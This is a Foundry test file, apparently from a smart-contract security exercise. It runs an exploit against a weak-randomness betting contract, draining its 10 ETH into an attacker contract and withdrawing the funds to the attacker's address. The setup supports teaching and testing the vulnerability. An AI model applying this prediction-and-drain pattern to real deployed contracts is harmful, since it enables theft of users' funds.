// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import "../src/hacks/EntropyIllusion.sol";

contract HowRandomIsRandomTest is Test {
    HowRandomIsRandom public howRandomIsRandom;
    AttackHowRandomIsRandom public attackContract;
    address public attacker;

    function setUp() public {
        // Deploy the vulnerable contract
        howRandomIsRandom = new HowRandomIsRandom();

        // Set up the attacker address
        attacker = address(0xBEEF);

        // Fund the vulnerable contract with 10 ETH
        vm.deal(address(howRandomIsRandom), 10 ether);

        // Fund the attacker to cover gas costs
        vm.deal(address(attacker), 1 ether);

        // Ensure the contract is funded
        assertEq(address(howRandomIsRandom).balance, 10 ether);
    }

    function testEntropyIllusionExploit() public {
        // Start prank as the attacker
        vm.startPrank(attacker);
        vm.roll(100);

        // Deploy the exploit contract, passing the vulnerable contract's address
        attackContract = new AttackHowRandomIsRandom{value: 0.02 ether}(payable(address(howRandomIsRandom)));

        // Second spin to win the game by predicting the random number
        attackContract.firstSpin{value: 0.01 ether}();

        // Second spin to win the game by predicting the random number
        attackContract.secondSpin{value: 0.01 ether}();

        vm.roll(101);

        // After the exploit, check that the vulnerable contract's balance is 0
        assertEq(address(howRandomIsRandom).balance, 0, "Vulnerable contract balance should be 0 after the exploit");

        // Check that the attacker contract has received the stolen funds
        assertGt(address(attackContract).balance, 10 ether, "Exploit contract should have more than 10 ether");

        // Withdraw funds from the exploit contract to the attacker's EOA
        attackContract.withdraw();
        assertGt(attacker.balance, 10 ether, "Attacker should have more than 10 ether after withdrawing funds");

        vm.stopPrank();
    }
}
